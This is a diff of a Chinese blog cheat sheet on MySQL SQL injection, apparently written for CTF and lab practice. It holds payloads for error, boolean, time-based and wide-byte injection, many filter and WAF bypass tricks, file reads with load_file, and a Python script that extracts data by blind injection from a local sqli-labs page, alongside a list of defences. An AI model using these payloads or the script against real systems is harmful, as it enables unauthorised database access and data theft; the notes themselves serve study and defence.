@@ -6,9 +6,15 @@ lastedittime = 2021-08-15T17:03:00
 uuid = "5134c576-2e83-4e1e-9b8f-cb6bd63bdc65"
 -+_+-
 
+
+
+# 1. Mysql变革
+
+
+
 ![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815133324.png)
 
-# 注入类型
+# 2. 注入类型
 
 
 
@@ -21,7 +27,31 @@ uuid = "5134c576-2e83-4e1e-9b8f-cb6bd63bdc65"
 
 ![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815170304.png)
 
-# 注入位置
+## 报错注入
+
+通过构造错误语句，使得查询信息在错误语句中回显
+
+## 布尔注入
+
+布尔注入通过布尔值来判断查询的正确与否，语句执行结果为真，返回真值时候的信息，语句执行结果为假，返回假值时候的信息
+
+## 延时注入
+
+延时注入是布尔现象的变形利用，在原本真假值的位置中插入延时语句，通过响应时间来判断真假值。
+
+## 宽字节注入
+
+> 当php开启gpc或者使用addslashes函数时，单引号`'`被加上反斜杠`\'`，其中`\`的URL编码为`%5C`，我们传入`%df'`，等价于`%df%5C'`，此时若程序的默认字符集是GBK，mysql用GBK编码时会认为`%df%5C`是一个宽字符`縗`，于是`%df%5C'`便等价于`縗'`，产生注入。
+
+```text
+id=1%df' and 1=2 union select 1,2,user(),4 %23
+```
+
+
+
+
+
+# 3. 注入位置
 
 
 
@@ -117,6 +147,7 @@ SELECT * FROM demo ORDER BY IF(true,id,username);
 	
 
 ### 情况三：order by 盲注（不需要知道字段名）
+
 ```sql
 SELECT * FROM demo ORDER BY IF(true,id,username)
 ```
@@ -128,6 +159,7 @@ SELECT * FROM demo ORDER BY IF(true,id,username)
 	```
 
 - 时间盲注
+
 	```sql
 	SELECT * FROM demo ORDER BY IF(true,1,sleep(1));
 	```
@@ -139,7 +171,9 @@ SELECT * FROM demo ORDER BY IF(true,id,username)
 ```sql
 SELECT id FROM users LIMIT InjectionPoint
 ```
+
 ​	这种情况下 `LIMIT`后面可以跟`UNION`进行联合查询注入
+
 ```sql
 SELECT id FROM users LIMIT 0,1 UNION SELECT USERNAME FROM users;
 ```
@@ -149,6 +183,7 @@ SELECT id FROM users LIMIT 0,1 UNION SELECT USERNAME FROM users;
 ```sql
 SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT InjectionPoint
 ```
+
 - 在使用`ORDER BY`的情况下，`Union`无法跟在`ORDER BY`后面
 - 在Mysql 5的语法里`LIMIT`后可以跟`PROCEDURE` 和`INTO`
 
@@ -208,8 +243,7 @@ SELECT [ALL | DISTINCT | DISTINCTROW ]
 	SELECT * FROM test LIMIT 0,1 INTO @;
 	```
 
-
-# 注入防止
+# 4. 注入防止
 
 
 
@@ -220,11 +254,13 @@ SELECT [ALL | DISTINCT | DISTINCTROW ]
 	1. 严格限制数据库权限（增加攻击成本，减少sql注入的危害）
 
 3. 代码层面：
-	1. sql预编译：
-	2. 使用过滤器进行sanitizer，转义敏感字符
-	3. 捕获sql执行异常，避免异常信息的直接回显，使用不被侧信道的自定义异常
-	4. sql执行异常监控并通知
-	5. 使用waf
+	1. 前端有效性校验和限制长度（增加攻击成本）
+	2. sql预编译
+	3. 使用过滤器进行sanitizer，转义敏感字符
+	4. 捕获sql执行异常，避免异常信息的直接回显，使用不被侧信道的自定义异常
+	5. sql执行异常监控并通知
+	6. 使用waf
+	7. 白名单检查
 
 > sql语句传入->检查缓存->规则验证->解析器解析为语法树->预处理器验证语法树->优化sql->生成执行计划->执行
 
@@ -242,6 +278,339 @@ SELECT [ALL | DISTINCT | DISTINCTROW ]
   - like语句比如： like '%whataver%'， like '%%%' 返回所有数据，需要转义%变成 \%
 
 
+
+# 5. 注入绕过
+
+
+
+## 基础绕过
+
+- 大小写绕过
+- 双写绕过
+- 内联注释
+
+
+
+### 常见注释符
+
+```
+//，-- , /**/, #, --+, --     -, ;,%00,--a
+```
+
+
+
+
+
+## 过滤逗号
+
+1. 使用 join 来进行绕过，可以绕过逗号
+
+	```sql
+	union select 1,2,3,4
+	union select * from ((select 1)A join(select 2)B join (select 3)C join(select 4)D);
+	```
+
+2. 使用盲注时，往往需要用到逗号，可以使用 from to 方式来绕过
+
+	```sql
+	select substr(database() from 1 for 1);
+	select mid(database() from 1 for 1);
+	```
+
+3. 使用 like 进行绕过
+
+	```sql
+	select ascii(mid(user(),1,1))=80  
+	等价于
+	select user() like 'r%'
+	```
+
+
+
+## 过滤引号
+
+1. 使用十六进制来代替
+
+
+
+
+
+## 过滤空格
+
+1. `/**/` 和 `/*!*/` 和`<>` 可以替代空格
+
+	```sql
+	se/**/lect  slee/*!*/p  information_sch<>ema  sel<>ect   slee<>p 
+	```
+
+2. 使用回车空格制表符等控制字符
+
+	```
+	%20（Space） %09（HT） %0d（\\r） %0b（VT） %0c（FF） %0d （CR） %a0（No-Break Space） %0a （New Line）
+	```
+
+3. 使用括号(子查询)左右两边可以不连接空格
+
+	```sql
+	select(user())from dual where(1=1)and(2=2)
+	```
+
+4. 浮点数后可以省略空格
+
+	```sql
+	select * from (select 8.0union select 2.0)a;
+	```
+
+	
+
+
+
+## 过滤 Limit 关键字
+
+如果过滤了limit 可以使用 offset来代替，同时也绕过逗号过滤
+
+```sql
+select * from news limit 0,1
+```
+
+\# 等价于下面这条SQL语句
+
+```sql
+select * from news limit 1 offset 0
+```
+
+ 
+
+## 过滤<，>
+
+1. 如果使用sqlmap可以使用between脚本绕过，between a and b 返回a，b之间的数据，不包含b
+2. 使用greatest函数和least函数
+
+```sql
+select * from users where id=1 and ascii(substr(database(),0,1))>64
+
+select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
+```
+
+ 
+
+## 过滤 or and xor not
+
+1. and=&&
+2. or=||
+3. xor=|
+4. not=！
+
+
+
+## 过滤 information_schema
+
+在2019-2020年间的CTF比赛比较流行的一类SQL注入题目都喜欢过滤 `information_schema`，`information_schema`是mysql获取表名的最主要途径，在这种情况下可以有以下思路：
+
+1. 利用InnoDB中的表，如` innodb_table_stats` 和`innodb_index_stats`，`innodb_index_stats` 会有重复的表名记录（这两个表无法获取column名字，需要配合子查询来使用）
+
+```sql
+select concat(table_name) from mysql.innodb_table_stats where database_name = database()
+
+select concat(table_name) from mysql.innodb_index_stats where database_name = database()
+```
+
+2. 使用内联注释 `/*!code*/`
+
+```sql
+select table_name from /*!InfoRmAtion_sCheMa*/.tables;
+```
+
+3. 利用 sys 表，与1相同，无法获取column 名字，需要配合子查询
+
+```sql
+# schema_auto_increment_columns
+select concat(table_name) from sys.schema_auto_increment_columns where table_schema = database();
+# schema_table_statistics_with_buffer 
+# x$schema_table_statistics_with_buffer
+select concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema = database();
+select concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema = database();
+```
+
+4. performance_schema
+
+```sql
+SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
+```
+
+
+
+## 过滤 concat
+
+
+
+![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815211057.png)
+
+![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815211114.png)
+
+将bits转为二进制，1的二进制为0001，倒过来为1000，取比特位为1的字符，这里从左往右取字符串，若该字符串所对应位置的比特位为0，则不取。最后返回比特位为1的子字符串由逗号分隔拼接的字符串。
+
+```sql
+select updatexml(1,make_set(3,'~',(select flag from flag)),1);
+```
+
+
+
+
+
+# 6. 注入Trick
+
+
+
+## 利用Order By判断列数
+
+```
+select * from test order by 2;
+```
+
+
+
+## Order By 无列名注入
+
+1. 如果场景中无法通过columns获取列名，可以通过union select 和 order by来爆破从而绕过列名限制
+
+![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815210348.png)
+
+可以通过虚拟的表来逐位逐位的得到被过滤的dog字段的值，在mysql中的排序，数字比字母先，字符串从前往后逐位比较。
+
+![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815210552.png)
+
+
+
+## 利用子查询（union+别名）进行无列名注入
+
+![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815210723.png)
+
+比如
+
+```mysql
+select `1` from (select 1,2,3,4,5,6,7,8 union select * from users)a limit 1 offset 1;
+select x.1 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d,(select 5)e,(select 6)f,(select 7)g,(select 8)h union select * from users)x limit 1 offset 1;
+select b from (select 1,2,3 as b union select * from admin)a;
+```
+
+
+
+```mysql
+id='1'-if(substr((select concat(`1`,0x3a,`2`) from (select 1,2 union select * from flag)a limit 1,1),{},1)='{}',concat(sleep(3),1-~0),1-~0)-'
+```
+
+
+
+## 利用 Join 进行无列名注入
+
+
+
+```mysql
+select * from (select * from (select 1 `a`)m join (select 2 `b`)n union select * from test3)x;
+ 
+select a from (select * from (select 1 `a`)m join (select 2 `b`)n union select * from test3)x;
+```
+
+
+
+## 利用join 、 join + using 报错获取列名
+
+
+
+```sql
+mysql> select * from (select * from test3 as a join test3 b)c;
+ERROR 1060 (42S21): Duplicate column name 'id'
+mysql> select * from (select * from test3 as a join test3 b using(id))c;
+ERROR 1060 (42S21): Duplicate column name 'username'
+```
+
+![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815213522.png)
+
+
+
+# 7. 权限相关
+
+
+
+## 文件相关
+
+### load_file
+
+load_file函数只有满足两个条件就可以使用：
+
+> 1、文件权限：chmod a+x pathtofile
+>
+> 2、文件大小: 必须小于max_allowed_packet 
+
+1、必须有权限读取并且文件必须完全可读。
+
+```
+and (select count(*) from mysql.user)>0 /*如果结果返回正常，说明具有读写权限.*/
+and (select count(*) from mysql.user)>0 /* 返回错误，应该是管理员给数据库账户降权了*/
+```
+
+2、欲读取文件必须在服务器上
+
+3、必须指定文件完整的路径
+
+4、欲读取文件必须小于max_allowed_packet
+
+​	如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。
+
+
+
+
+
+
+
+# 8. 板子
+
+
+
+二分法板子：
+
+```python
+#!/usr/bin/python3
+#coding:utf-8
+import requests
+import re, string
+
+# payloadTmpl = "(slect if(substr(version(),{},1)>{},exp(72),exp(800)));%23"
+# proxy = {"http":"http://127.0.0.1:8080"}
+url = "http://localhost/sqli-labs-php7/Less-5/?id=1%27 and ascii(substr((select database()),{},1))>{} %23"
+SuccessFlag = "You are in..."
+
+def sendReq(payload):
+    res = requests.get(payload)
+    return res
+
+def verify(payload):
+    r = sendReq(payload)
+    if re.findall(SuccessFlag, r.text) != []:
+        return True
+    return False
+
+def half_interval():
+    result = ""
+    for i in range(1,9):
+        min = 32
+        max = 127
+        while abs(max-min) > 1:
+            mid = (min + max)//2
+            # payload = payloadTmpl.format(i,mid)
+            payload = url.format(i,mid)
+            print(payload)
+            if verify(payload):
+                min = mid
+            else:
+                max = mid
+        result += chr(max)
+        print(result)
+
+if __name__ == "__main__":
+    half_interval()
+```
 
 
 
